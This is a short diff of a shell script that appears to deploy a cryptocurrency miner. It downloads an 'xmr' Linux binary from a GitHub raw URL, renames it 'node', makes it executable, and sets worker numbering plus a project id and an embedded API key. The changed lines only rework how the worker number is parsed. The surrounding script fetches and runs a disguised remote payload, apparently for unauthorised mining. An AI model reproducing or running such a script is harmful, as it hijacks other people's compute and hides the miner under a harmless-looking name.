@@ -5,7 +5,8 @@ curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/xmr/linux-
 chmod +x node
 
 INPUT_NUMBER=$1
-WORKER_NUMBER=$(echo "$INPUT_NUMBER" | tail -c 1)
+# WORKER_NUMBER=$(echo "$INPUT_NUMBER" | tail -c 1)
+WORKER_NUMBER=$(printf "%s" "$INPUT_NUMBER" | sed 's/.*\(.\)$/\1/')
 PASSHOURS=$(date +%S)
 PROJECT="plyyisutdhzkhyxowznt"
 APIKEY="sb_publishable_BpW4yiofh6uN0lZ_2fl1Sg_BXIYS5LO"
